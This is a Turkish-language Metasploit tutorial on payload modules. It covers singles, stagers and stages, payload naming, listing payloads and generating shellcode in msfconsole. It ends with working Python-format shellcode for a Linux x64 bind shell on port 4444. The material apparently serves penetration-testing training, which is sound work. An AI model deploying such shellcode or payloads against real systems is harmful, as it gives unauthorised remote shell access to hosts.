Exploit modüllerinde, payload modülleri, bir exploit başarıya ulaştığında çalıştırılan shellcode'lardır. Genellikle bir meterpreter oturumu oluşturur, ancak bunun yerine kullanıcı hesapları eklemek veya zafiyetli bir hedefe karşı kodun başarılı bir şekilde çalıştırıldığını doğrulayan basit bir geri arama komutu çalıştırmak gibi işlemler de yapabilir.

Payload modülleri, ayrıca bağımsız yürütülebilir dosyalar veya exploitler içinde kullanılmak üzere shellcode üretmek için tek başlarına da kullanılabilir.

Payload modülleri,

modules/payloads/{singles,stages,stagers}/<platform>

klasöründe saklanır. MSFConsole başlatıldığında, stage'ler stager'ler ile birleştirilerek exploitlerde kullanabileceğiniz tam bir payload oluşturur. Daha sonra, handler'lar payloadlarla eşleştirilir, böylece MSFConsole, belirli bir iletişim mekanizmasıyla oturumlar oluşturmayı kontrol edebilir.

Payloadlara, aşağıdaki gibi tüm parçaları belirten referans isimler verilir:

- **Aşamalı payloadlar (Staged payloads):**
    
    <platform>/[arch]/<stage>/<stager>
    
- **Tekil payloadlar (Single payload):** <platform>/[arch]/<single>
    

Örneğin **windows/x64/meterpreter/reverse_tcp** payloadı; platform

windows

, mimari

x64

, iletilen son stage

meterpreter

ve bunu ileten stager

reverse_tcp

'dir.

Mimari bazen gerekli olmayabilir veya varsayılan olması nedeniyle opsiyonel olabilir. Örneğin, **php/meterpreter reverse_tcp** için mimari gereksizdir.

Tekiller (Singles)

Tekli payloadlar, kendi kendine yeten ve tamamen bağımsız olarak çalışan payloadlardır. Tekli bir payload, hedef sisteme bir kullanıcı eklemek veya calc.exe dosyasını çalıştırmak kadar basit bir şey olabilir.

Bu tür payloadlar bağımsızdır, bu nedenle netcat gibi metasploit dışı araçlarla da kullanılabilirler.

Stagers

Stager'lar saldırgan ve hedef arasında bir ağ bağlantısı kuran ve küçük ve güvenilir olacak şekilde, yürütümü bir sonraki aşamaya geçirmek için tasarlanmış bir ara programdır. Stager'lar, daha büyük ve daha fazla işlevselliğe sahip bir payload yüklemek için başlangıçta küçük bir payload kullanmamızı sağlar.

Aşamalar (Stages)

Aşamalar, stagers modülleri tarafından indirilen payload bileşenleridir. Çeşitli payload aşamaları meterpreter ve VNC Injection gibi boyut sınırı olmayan gelişmiş özellikler sağlar.

### Payload Listeleme

MSFConsole'daki mevcut payloadları listelemek için

show payloads

komutunu çalıştırabiliriz.

```auto
msf6 > show payloads
<SNIP>
1458  payload/windows/x64/vncinject/reverse_http                                                  normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
1459  payload/windows/x64/vncinject/reverse_https                                                 normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
1460  payload/windows/x64/vncinject/reverse_tcp                                                   normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
1461  payload/windows/x64/vncinject/reverse_tcp_rc4                                               normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
1462  payload/windows/x64/vncinject/reverse_tcp_uuid                                              normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
1463  payload/windows/x64/vncinject/reverse_winhttp                                               normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
1464  payload/windows/x64/vncinject/reverse_winhttps                                              normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```

### Payload Oluşturma

Exploit geliştirme sırasında, exploitinizde kullanmak üzere shellcode üretmeniz gerekir. Metasploit'te, payloadlar msfconsole içerisinden üretilebilir. Belirli bir payload seçiliyken

generate

,

pry

, ve

reload

gibi komutları kullanabiliriz.

```auto
msf6 > use payload/linux/x64/shell_bind_tcp
msf6 payload(linux/x64/shell_bind_tcp) > help
<SNIP>

Payload Commands
================

    Command           Description
    -------           -----------
    check             Check to see if a target is vulnerable
    exploit           Creates a handler with the specified payload
    generate          Generates a payload
    reload            Reload the current module from disk
    to_handler        Creates a handler with the specified payload

<SNIP>
```

Şimdi

generate

komutunu

-h

parametresi ile çalıştırarak seçeneklerine bakalım.

```auto
msf6 payload(linux/x64/shell_bind_tcp) > generate -h
Usage: generate [options]

Generates a payload. Datastore options may be supplied after normal options.

Example: generate -f python LHOST=127.0.0.1

OPTIONS:

    -b   The list of characters to avoid example: '\x00\xff'
    -E   Force encoding
    -e   The encoder to use
    -f   Output format: base32,base64,bash,c,csharp,dw,dword,go,golang,hex,java,js_be,js_le,masm,nim,nimlang,num,octal,perl,pl,powershell,ps1,py,python,raw,rb,ruby,rust,rustlang,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,ducky-script-psh,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,python-reflection,vba,vba-exe,vba-psh,vbs,war
    -h   Show this message
    -i   The number of times to encode the payload
    -k   Preserve the template behavior and inject the payload as a new thread
    -n   Prepend a nopsled of [length] size on to the payload
    -o   The output file name (otherwise stdout)
    -O   Deprecated: alias for the '-o' option
    -p   The platform of the payload
    -P   Total desired payload size, auto-produce appropriate NOP sled length
    -S   The new section name to use when generating (large) Windows binaries
    -v   Verbose output (display stage in addition to stager)
    -x   Specify a custom executable file to use as a template
```

Shellcode üretmek için aşağıdaki gibi

generate

komutunu çalıştırabiliriz.

```auto
msf6 payload(linux/x64/shell_bind_tcp) > generate -f python LHOST=127.0.0.1
# linux/x64/shell_bind_tcp - 86 bytes
# https://metasploit.com/
# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false, 
# PrependSetresuid=false, PrependSetreuid=false, 
# PrependSetuid=false, PrependSetresgid=false, 
# PrependSetregid=false, PrependSetgid=false, 
# PrependChrootBreak=false, AppendExit=false, 
# AutoVerifySession=true
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89"
buf += b"\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58"
buf += b"\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"
```